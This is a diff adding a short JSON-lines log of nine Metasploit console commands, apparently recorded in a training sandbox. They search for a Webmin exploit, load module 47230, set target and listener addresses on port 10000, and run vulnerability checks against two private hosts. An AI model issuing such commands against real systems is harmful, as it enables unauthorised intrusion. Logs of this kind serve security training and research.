@@ -1,0 +1,9 @@
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:54:32.0+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:55:14.0+02:00", "cmd_type": "msf-command", "cmd": "use exploit/47230"}
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:55:30.0+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:56:46.0+02:00", "cmd_type": "msf-command", "cmd": "set RHOST 172.18.5.1"}
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:56:53.0+02:00", "cmd_type": "msf-command", "cmd": "set RPORT 10000"}
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:57:28.0+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:57:45.0+02:00", "cmd_type": "msf-command", "cmd": "check"}
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:57:56.0+02:00", "cmd_type": "msf-command", "cmd": "set RHOST 172.18.1.5"}
+{"sandbox_id": "195", "timestamp_str": "2019-12-12T11:57:59.0+02:00", "cmd_type": "msf-command", "cmd": "check"}
